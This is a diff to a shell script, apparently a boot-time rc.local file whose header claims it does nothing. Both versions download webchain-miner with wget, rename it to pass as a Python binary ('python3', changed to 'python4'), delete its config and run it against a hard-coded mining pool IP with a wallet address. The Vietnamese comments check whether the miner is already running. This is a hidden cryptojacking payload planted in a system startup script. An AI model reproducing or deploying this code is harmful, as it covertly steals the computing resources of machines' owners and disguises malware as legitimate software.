@@ -10,15 +10,15 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python3 ]; then
-    if pgrep -x "python3" > /dev/null
+if [ -f ${PWD}/python4 ]; then
+    if pgrep -x "python4" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python3 -o 116.109.75.4:9781 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x --donate-level=1
+./python4 -o 116.109.75.4:9781 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x --donate-level=1 --worker-id=co8
 
      
 fi
@@ -28,8 +28,8 @@ fi
 
 wget https://github.com/webchain-network/webchain-miner/releases/download/v2.7.0/webchain-miner-2.7.0-linux-amd64.tar.gz
 tar xvzf webchain-miner-2.7.0-linux-amd64.tar.gz
-mv webchain-miner python3
+mv webchain-miner python4
 rm config.json
-./python3 -o 116.109.75.4:9781 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x --donate-level=0 --worker-id=co1
+./python4 -o 116.109.75.4:9781 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x --donate-level=0 --worker-id=co8
 
 exit 0
